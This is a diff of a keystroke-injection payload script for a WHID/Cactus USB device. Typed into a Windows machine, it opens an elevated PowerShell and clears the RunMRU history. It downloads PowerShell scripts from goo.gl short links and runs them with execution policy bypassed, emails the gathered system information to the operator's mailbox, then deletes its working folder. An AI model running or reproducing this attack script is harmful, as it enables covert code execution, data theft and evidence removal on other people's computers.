@@ -1,41 +1,26 @@
-Rem:*****************
-Rem:# Let's Get Privileged
-Rem:*****************
-Rem:#GUI r
 Press:131+114
-CustomDelay:100
+CustomDelay:1000
 Print:powershell Start-Process powershell -Verb runAs 
 Press:176
-CustomDelay:500
+CustomDelay:700
 Press:130+121
-CustomDelay:500
-Rem:*****************
-Rem:# Get Prickly on Quack #
-Rem:*****************
-Print:New-Item -ItemType directory -Path C:\quactus\; cd C:\quactus\; cls
+CustomDelay:700
+Print:clear;
 Press:176
-CustomDelay:450
-Print:$source = "https://raw.githubusercontent.com/0rion5/WHID-Quactus-Payloads/master/library/Quactus/recon/InfoGrabber/run.ps1"; $destination = "C:\quactus\run.ps1"; Invoke-WebRequest $source -OutFile $destination; cls
-CustomDelay:100
+Print:remove-item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU";
 Press:176
-CustomDelay:100
-Print:$source = "https://raw.githubusercontent.com/0rion5/WHID-Quactus-Payloads/master/library/Quactus/recon/InfoGrabber/info.ps1"; $destination = "C:\quactus\info.ps1"; Invoke-WebRequest $source -OutFile $destination; cls
-CustomDelay:100
+Print:New-Item -ItemType directory -Path C:\quactus\; 
 Press:176
-CustomDelay:100
+Print:cd C:\quactus\; cls
+Press:176
+Print:$source = "https://goo.gl/yDyhxh"; $destination = "C:\quactus\run.ps1"; Invoke-WebRequest $source -OutFile $destination; cls
+Press:176
+Print:$source = "https://goo.gl/CDZHwY"; $destination = "C:\quactus\info.ps1"; Invoke-WebRequest $source -OutFile $destination; cls
+Press:176
 Print:PowerShell.exe -ExecutionPolicy Bypass -File run.ps1; cls
-CustomDelay:100
 Press:176
-CustomDelay:1000
-Rem:*****************
-Rem:# Let's e-mail ourselves and clean up #
-Rem:*****************
 Print:$SMTPServer = 'SMTP.MAIL.COM HERE'; $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587); $SMTPInfo.EnableSSL = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUREMAILHERE', 'YOURPASSWORD HERE'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'YOUREMAIL HERE'; $ReportEmail.To.Add('YOUREMAIL HERE'); $ReportEmail.Subject = 'Thats a Prickly Cactus Quack Quack'; $ReportEmail.Body = (Get-Content C:\quactus\info\* | out-string); $SMTPInfo.Send($ReportEmail); cd ..; cls
 CustomDelay:100
 Press:176
-CustomDelay:1000
-Rem:*****************
-Rem:# Cleanup
-Rem:*****************
 Print:Remove-Item -path C:\quactus -recurse -force; cls; exit
 Press:176
